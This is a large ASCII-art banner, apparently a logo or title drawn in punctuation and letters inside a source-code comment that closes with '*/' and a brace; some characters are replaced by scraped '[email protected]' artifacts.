:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@B!^:!GPPPPPPG?:^^^^^^^^^^[email protected]@#!^:!PPPPPPPGJ::[email protected] 7GPPPPPPP^[email protected]@@&~.YPPPPPPPY.^!.YGPPPPPPY^^^^^^YPPPPPPPP:.G.^PPPPPPPG7 [email protected]@@@P !GPPPPPPG7 [email protected] ~GPPPPPPG7 ^^^^^^:YPPPPPPPP:.B? ?GPPPPPP5::#@@&.^PPPPPPPGJ [email protected]@@&7......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.^[email protected]@@#G7 !GPPPPPPP~ 5#######&@@@@@@5 ~PPPPPPPP!  .?YJJJJJJJ.:@!.YPPPPPPP5::5P5PY.:5PPPPPPG? 7::5PPPPPPPJ 7#B^.YPPPPPPPY.!5 !PPPPPPPG~ [email protected]@@@J ?GPPPPPPP~.5.^PPPPPPPG? [email protected] !GPPPPPPP~ 5####~ YPPPPPPPP.:&^.5PPPPPPPY ^5PPJ ~PPPPPPPP7 7#@@@&?.::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@B::!75PPPPPPP5::#@@@&@&&&#B&@@@J ?PPPPPPPP?!!?PPPPPPPGJ.!#^:5PPPPPPP57!!!!!!7YPPPPPPPG7 ? ~GPPPPPPP7 [email protected]# ^PPPPPPPP? J? ?GPPPPPPP^.#@@@@~ JPPPPPPP5.^Y !GPPPPPPP! [email protected] JGPPPPPPP::#@@@#^:5PPPPPPPJ 7#.:[email protected]@@B^.::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@5 [email protected]@@@!^^~^:~&@@@! YPPPPPPPPPPPPPPPPPPPG? JG.^PPPPPPPPPPPPPPPPPPPPPPPPPP^:7 !GPPPPPPP^[email protected] !GPPPPPPP! 5!.YGPPPPPPY.~&@@@&:.5PPPPPPPY !J 7GPPPPPPP^:[email protected]^[email protected]@@@G ~PPPPPPPG7 YP.~PPPPPPPPPPPPPPPPPPPPPPPPPPG? [email protected]@@B:.:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.^#@@@? ?PPPPPPPPPP? [email protected]@@#:[email protected]@@#^:5PPPPPPPPPPPPPPPPPPPP! P5 7GPPPPPPPPPPPPPPPPPPPPPPPP5.~~.JGPPPPPP5::#@? 7GPPPPPPP^:G.^PPPPPPPGJ [email protected]@@@G.^PPPPPPPP7 J!.5PPPPPPP5.^@B.^PPPPPPPG? [email protected]@@@Y 7GPPPPPPP! BJ ?GPPPPPPPPPPPPPPPPPPPPPPPPPP~ [email protected]@@P.:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@^.YPPPPPPPPPG! [email protected]@@P:.::[email protected]@@B.^PPPPPPPPPPPPPPPPPPPPP::#J ?GPPPPPPPPPPPPPPPPPPPPPPPGJ !^:[email protected]@~.5PPPPPPG5.^P.~PPPPPPPP7 Y&GGG? 7GPPPPPPG~ 5^:PPPPPPPPJ [email protected] !PPPPPPPG! [email protected]@@@7 JGPPPPPP5::#7.YGPPPPPPPPPPPPPPPPPPPPPPPPPP::#@@@?....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::[email protected]@@#.:555555555Y7.!&@@@7...::[email protected]@@&[email protected]^Y55555555555555555555555?:^5.:Y5555555! [email protected]#::Y5555555? 75 !55555555:.7:^~~~!5PPPPPPPP^:P.^55555555~ 5#..J55555555^ #@@@@:.Y5555555J [email protected][email protected]@@@~....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::.~&@@@Y!~~~~~~~~~~?5&@@@Y.......:[email protected]@@#[email protected]@@G?!~~~~~~~~~~~~~~~~~~~~~~~!Y#&J!~~~~~~~~~?#@&Y!~~~~~~~~~7B#?~~~~~~~~~!Y^.YGPPPPPPPPPPPY.~#J!~~~~~~~~~J&&J!~~~~~~~~~!Y&@@@@[email protected]@G?~~~~~~~~~~~~~::JGPPPPPG5^:[email protected]@@G:...:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@@@@@@@@@@@@@@&G7....::...:?#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.^PPPPPPPPPPPPG? [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y.^~~~~~~~^.7&@@@@G~.......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:75GB#########BG5J~:...:....:...:!YPG##################BP5?~?5GB######################BGPY5PB########BG5JYPB########BG55GB#####&@@@P !GPPPPPPPPPPPG! [email protected]@@&#######BG55GB#########BP57^75PB#########BPYJ5GB#########&@@@#GPPPPPPPGB&@@@5!:.:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:::::::::::.......:.......:......:::::::::::::::::::.......::::::::::::::::::::::::.....::::::::::.....::::::::::....:::::^#@@@J 7PPPPPPPPPPP57.~&@@@7::::::::....:::::::::::.......:::::::::::.....::::::::::~5#&@@@@@@@@@@@&#P7......:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.................................::::..............................[email protected]@@G!~~~~~~~~~~~~~!Y&@@@5:...........................::.............................:^~!77777777!^:............:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...........:::::::::::::::::::....:::::::::::::::::::::::::::::::::....::::::::::::::::::::::::::::::..........:::::::::::...:[email protected]@@@&&&&&&&&&&&&&@@@@#?.................::::::::::::::::....:::::::::::::::::::...................:...........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::.:75GB#&&&&&&&&&&&#BPY!:..:.::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.:::....:::::.:....::::::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....::^^^^^^^^^^^::.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....................:::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
*/
}